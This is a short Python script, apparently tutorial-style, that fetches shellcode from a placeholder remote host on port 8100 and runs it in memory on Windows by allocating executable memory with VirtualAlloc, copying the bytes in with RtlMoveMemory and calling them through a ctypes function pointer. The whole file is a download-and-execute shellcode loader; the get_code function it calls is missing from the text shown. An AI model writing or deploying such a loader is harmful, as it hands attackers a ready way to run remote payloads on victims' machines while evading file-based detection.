from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def write_memory(buf):
    length = len(buf)
    # to write into memory, we have to allocate memory
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # move the buffer containing shellcode into allocated memory
    kernel32.RtlMoveMemory.argtypes = (
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_size_t)
    # 0x40 parameter = memory should have permissions set to execute and read write access
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # move buffer in allocated memory and return pointer to buffer
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    # allocating buffer to hold shellcode after decoded
    buffer = ctypes.create_string_buffer(shellcode)
    # to write the buffer into memory
    ptr = write_memory(buffer)
    # ctypes.cast function allows to cast the buffer to act like function pointer so that we can call our shell code as we would call normal func
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://<IP>:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
